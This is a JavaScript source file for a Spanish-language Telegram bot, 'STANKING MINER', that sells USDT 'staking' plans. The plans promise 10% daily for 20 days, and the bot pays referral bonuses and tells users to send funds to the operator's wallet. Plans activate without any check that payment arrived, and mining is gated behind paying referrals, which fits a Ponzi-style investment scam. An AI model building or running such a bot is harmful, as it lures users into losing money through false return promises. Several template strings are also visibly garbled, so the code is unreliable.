import 'dotenv/config'
import { Telegraf, Markup } from 'telegraf'
import { Wallet, ethers } from 'ethers'
import fs from 'fs'

console.log('INICIANDO STANKING MINER...')

const bot = new Telegraf(process.env.TELEGRAM_TOKEN)

// === BASE DE DATOS LOCAL ===
let users = {}
const DB_FILE = 'users.json'
if (fs.existsSync(DB_FILE)) {
  try { users = JSON.parse(fs.readFileSync(DB_FILE, 'utf8')) } catch (e) { console.error('Error cargando DB:', e) }
}
function save() { fs.writeFileSync(DB_FILE, JSON.stringify(users, null, 2)) }

// === WEB3 + USDT ===
const provider = new ethers.JsonRpcProvider(process.env.RPC_URL)
const wallet = new Wallet(process.env.PRIVATE_KEY, provider)
const USDT = new ethers.Contract(
  "0x55d398326f99059fF775485246999027B3197955",
  ["function transfer(address to, uint amount) returns (bool)"],
  wallet
)
const PLANES = {1:0.1, 3:0.3, 5:0.5, 10:1.0, 20:2.0, 30:3.0, 50:5.0}
const BOT_WALLET = process.env.WALLET_BOT || wallet.address

// === MENÚ PRINCIPAL ===
async function menu(ctx) {
  await ctx.reply("STANKING MINER\nPagos 100% reales · Mínimo retiro 1 USDT", Markup.keyboard([
    ['Staking', 'Minería'],
    ['Ganancias', 'Retiro'],
    ['Referidos', 'Soporte']
  ]).resize())
}

// === /start + VERIFICACIÓN ===
bot.start(async (ctx) => {
  const id = ctx.from.id.toString()
  const ref = ctx.startPayload || null

  if (!users[id]) {
    const code = Math.floor(1000 + Math.random() * 9000)
    users[id] = { verified: false, verifyCode: code, balance: 0, planes: [], ref_validos: 0, last_mine: 0, referidos: 0, inviter: ref }
    save()
    await ctx.reply(`VERIFICACIÓN REQUERIDA\n\nEscribe este código:\n\n\`${code}\``, { parse_mode: "Markdown" })
    if (ref && users[ref]) {
      users[ref].referidos += 1
      users[ref].balance += 0.02
      save()
      bot.telegram.sendMessage(ref, "¡Nuevo referido +0.02 USDT!").catch(() => {})
    }
  } else if (!users[id].verified) {
    await ctx.reply(`Escribe tu código:\n\n\`${users[id].verifyCode}\``, { parse_mode: "Markdown" })
  } else {
    menu(ctx)
  }
})

// === VERIFICAR CÓDIGO + RETIRO ===
bot.on('text', async (ctx) => {
  const id = ctx.from.id.toString()
  const text = ctx.message.text.trim()

  // VERIFICACIÓN
  if (users[id] && !users[id].verified && text === users[id].verifyCode.toString()) {
    users[id].verified = true
    delete users[id].verifyCode
    save()
    await ctx.reply("¡Verificado con éxito! Bienvenido")
    menu(ctx)
    return
  }
  if (!users[id]?.verified) return

  // RETIRO
  if (ctx.session?.step === "retiro") {
    if (!text.match(/^0x[a-fA-F0-9]{40}$/i)) return ctx.reply("Wallet inválida")
    const amount = users[id].balance
    if (amount < 1) return ctx.reply("Mínimo 1 USDT")
    await ctx.reply("Procesando retiro...")
    try {
      const tx = await USDT.transfer(text, ethers.parseUnits(amount.toString(), 18))
      await tx.wait()
      users[id].balance = 0
      save()
      await ctx.reply(`Retiro exitoso!\n\( {amount.toFixed(3)} USDT\nhttps://bscscan.com/tx/ \){tx.hash}`)
    } catch (e) {
      await ctx.reply("Error: " + e.message.slice(0, 150))
    }
    ctx.session.step = null
    menu(ctx)
    return
  }
})

// === COMANDOS ===
bot.hears('Ganancias', (ctx) => {
  const u = users[ctx.from.id.toString()]
  ctx.reply(`Tu balance: ${u.balance.toFixed(3)} USDT`)
})

bot.hears('Retiro', (ctx) => {
  const u = users[ctx.from.id.toString()]
  if (u.balance < 1) return ctx.reply("Mínimo 1 USDT")
  ctx.reply("Envía tu wallet BEP-20:")
  ctx.session = { step: "retiro" }
})

bot.hears('Staking', (ctx) => {
  ctx.reply("Elige tu plan (10% diario × 20 días):", Markup.inlineKeyboard([
    [Markup.button.callback("1 USDT → 0.1/día", "buy_1"), Markup.button.callback("3 USDT → 0.3/día", "buy_3")],
    [Markup.button.callback("5 USDT → 0.5/día", "buy_5"), Markup.button.callback("10 USDT → 1/día", "buy_10")],
    [Markup.button.callback("20 USDT → 2/día", "buy_20"), Markup.button.callback("30 USDT → 3/día", "buy_30")],
    [Markup.button.callback("50 USDT → 5/día", "buy_50")]
  ]))
})

bot.hears('Minería', (ctx) => {
  const id = ctx.from.id.toString()
  const u = users[id]
  if (u.ref_validos < 5) return ctx.reply(`Necesitas 5 referidos válidos\nTienes: ${u.ref_validos}/5`)
  const puede = Date.now() - (u.last_mine || 0) >= 86400000
  ctx.reply(puede ? "¡Puedes reclamar 0.03 USDT!" : "Espera 24h", puede ? Markup.inlineKeyboard([[Markup.button.callback("RECLAMAR", "mine")]]) : null)
})

bot.hears('Referidos', async (ctx) => {
  const id = ctx.from.id.toString()
  const me = await bot.telegram.getMe()
  const link = `https://t.me/\( {me.username}?start= \){id}`
  const u = users[id]
  ctx.replyWithMarkdown(`*Tus referidos*\nTotal: \( {u.referidos}\nVálidos: \){u.ref_validos}\n\nEnlace:\n${link}`)
})

bot.hears('Soporte', (ctx) => ctx.reply("Soporte: @Carlo2187"))

// === INLINE BUTTONS ===
bot.action(/buy_(\d+)/, async (ctx) => {
  const monto = ctx.match[1]
  await ctx.answerCbQuery()
  await ctx.replyWithMarkdown(`*Plan \( {monto} USDT*\nEnvía * \){monto} USDT* a:\n\`\( {BOT_WALLET}\`\nLuego CONFIRMAR`, Markup.inlineKeyboard([[Markup.button.callback("CONFIRMAR", `confirm_ \){monto}`)]]))
})

bot.action(/confirm_(\d+)/, async (ctx) => {
  const monto = parseInt(ctx.match[1])
  const id = ctx.from.id.toString()
  await ctx.answerCbQuery("¡Plan activado!")
  users[id].planes.push({ amount: monto, daily: PLANES[monto], last_claim: Date.now() })
  if (users[id].inviter && users[users[id].inviter]) users[users[id].inviter].ref_validos += 1
  save()
  await ctx.reply("PLAN ACTIVADO!")
  menu(ctx)
})

bot.action('mine', async (ctx) => {
  const id = ctx.from.id.toString()
  if (Date.now() - (users[id].last_mine || 0) >= 86400000) {
    users[id].balance += 0.03
    users[id].last_mine = Date.now()
    save()
    await ctx.answerCbQuery("+0.03 USDT")
    ctx.reply("+0.03 USDT acreditado!")
  }
  menu(ctx)
})

// === ARRANQUE DEFINITIVO ===
bot.launch({ dropPendingUpdates: true })
  .then(() => console.log('BOT 100% CONECTADO Y RESPONDIENDO EN TELEGRAM'))
  .catch(err => console.error('ERROR AL CONECTAR:', err))

process.once('SIGINT', () => bot.stop('SIGINT'))
process.once('SIGTERM', () => bot.stop('SIGTERM'))
